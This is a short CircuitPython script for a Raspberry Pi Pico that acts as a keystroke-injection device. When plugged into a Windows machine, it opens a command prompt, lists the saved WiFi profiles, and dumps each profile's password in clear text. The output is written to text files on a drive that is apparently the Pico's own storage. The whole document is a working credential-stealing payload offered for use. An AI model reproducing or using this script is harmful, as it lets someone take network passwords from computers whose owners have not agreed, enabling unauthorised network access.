#Recovers stored WiFi passwords to txt files in the Rpi pico


import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from keyboard_layout_win_es import KeyboardLayout

from SSID_parser import parseSSIDS

###############################
def pressEnter():
    kb.press(Keycode.ENTER)
    kb.release_all()
###############################


kb=Keyboard(usb_hid.devices)
ly=KeyboardLayout(kb)

#Open CMD
kb.send(Keycode.WINDOWS)
time.sleep(0.5)

kb.send(Keycode.C,Keycode.M,Keycode.D)
time.sleep(0.5)
pressEnter()
time.sleep(1)
#CMD command

ly.write("netsh wlan show profiles > D:OUTPUTS/WifiPasswords/toParse.txt")
pressEnter()
ssids=parseSSIDS()
for s in ssids:
    ly.write("netsh wlan show profile name="+s+" key=clear > D:OUTPUTS/WifiPasswords/"+s+"_password.txt")
    time.sleep(0.5)
    pressEnter()
    time.sleep(0.5)

#Exit CMD
time.sleep(1)
ly.write("exit")
time.sleep(0.1)
pressEnter()
